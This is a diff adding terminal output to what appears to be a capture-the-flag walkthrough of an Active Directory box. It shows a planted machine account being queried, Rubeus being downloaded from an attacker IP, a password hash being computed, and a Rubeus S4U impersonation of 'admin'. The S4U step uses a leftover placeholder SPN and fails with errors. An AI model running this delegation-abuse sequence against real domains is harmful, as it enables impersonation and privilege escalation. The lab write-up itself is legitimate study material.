@@ -1312,6 +1312,157 @@ Bloodhound pic:
 *Evil-WinRM* PS C:\Users\support\Documents> import-module .\powerview.ps1
 ```
 
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer -Identity attackersystem
+
+
+pwdlastset             : 7/13/2026 11:44:19 AM
+logoncount             : 0
+badpasswordtime        : 12/31/1600 4:00:00 PM
+distinguishedname      : CN=attackersystem,CN=Computers,DC=support,DC=htb
+objectclass            : {top, person, organizationalPerson, user...}
+name                   : attackersystem
+objectsid              : S-1-5-21-1677581083-3380853377-188903654-6102
+samaccountname         : attackersystem$
+localpolicyflags       : 0
+codepage               : 0
+samaccounttype         : MACHINE_ACCOUNT
+accountexpires         : NEVER
+countrycode            : 0
+whenchanged            : 7/13/2026 6:44:19 PM
+instancetype           : 4
+usncreated             : 90262
+objectguid             : 6c82eb5a-1209-4a45-b953-3188f5509020
+lastlogon              : 12/31/1600 4:00:00 PM
+lastlogoff             : 12/31/1600 4:00:00 PM
+objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
+dscorepropagationdata  : 1/1/1601 12:00:00 AM
+serviceprincipalname   : {RestrictedKrbHost/attackersystem, HOST/attackersystem, RestrictedKrbHost/attackersystem.support.htb, HOST/attackersystem.support.htb}
+ms-ds-creatorsid       : {1, 5, 0, 0...}
+badpwdcount            : 0
+cn                     : attackersystem
+useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
+whencreated            : 7/13/2026 6:44:19 PM
+primarygroupid         : 515
+iscriticalsystemobject : False
+usnchanged             : 90264
+dnshostname            : attackersystem.support.htb
+
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer attackersystem -Properties objectSid
+
+
+DistinguishedName : CN=attackersystem,CN=Computers,DC=support,DC=htb
+DNSHostName       : attackersystem.support.htb
+Enabled           : True
+Name              : attackersystem
+ObjectClass       : computer
+ObjectGUID        : 6c82eb5a-1209-4a45-b953-3188f5509020
+objectSid         : S-1-5-21-1677581083-3380853377-188903654-6102
+SamAccountName    : attackersystem$
+SID               : S-1-5-21-1677581083-3380853377-188903654-6102
+UserPrincipalName :
+
+```
+
+importing rubeus
+
+```
+*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8001/Rubeus.exe','C:\Users\support\Documents\Rubeus.exe')
+```
+
+```
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Summer2018!
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Summer2018!
+[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
+
+[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\attackersystem$'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      cnQuaHRi
+
+
+[*] Action: S4U
+
+[*] Using domain controller: dc.support.htb (::1)
+[*] Building S4U2self request for: 'attackersystem$@SUPPORT.HTB'
+[*] Sending S4U2self request
+
+[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN
+
+[*] Impersonating user 'admin' to target SPN 'cifs/TARGETCOMPUTER.testlab.local'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Building S4U2proxy request for service: 'cifs/TARGETCOMPUTER.testlab.local'
+
+[!] Unhandled Rubeus exception:
+
+System.NullReferenceException: Object reference not set to an instance of an object.
+   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
+   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, Boolean bronzebit, String keyString, KERB_ETYPE encType, String requestDomain, String impersonateDomain)
+   at Rubeus.S4U.Execute(String userName, String domain, String keyString, KERB_ETYPE etype, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean self, Boolean opsec, Boolean bronzebit)
+   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
+   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
+   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)
+
+```
 ### Exploitation
 
 Step-by-step privilege escalation.
